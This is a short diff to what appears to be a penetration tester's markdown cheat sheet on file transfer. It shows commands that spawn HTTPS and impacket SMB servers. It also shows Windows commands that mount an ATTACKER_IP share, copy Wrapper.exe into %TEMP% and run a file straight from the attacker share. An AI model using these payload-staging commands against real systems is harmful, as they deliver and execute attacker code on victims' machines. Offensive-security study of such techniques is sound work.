@@ -621,12 +621,12 @@ cat <&3
 - https: Create certificate + spawn https server
   - openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
   - python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
-
    
 - option 3 - smbserver
-  -  create server: sudo /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
+  -  create server: smbserver.py share . -smb2support -username user -password s3cureP@ssword
   -  create client: net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
   -  upload file: copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
+  -  run directly: cmd_to_run \\ATTACKER\SHARE\file
   -  smbclient -U USER '//IP/folder'
 
 ### Native tools
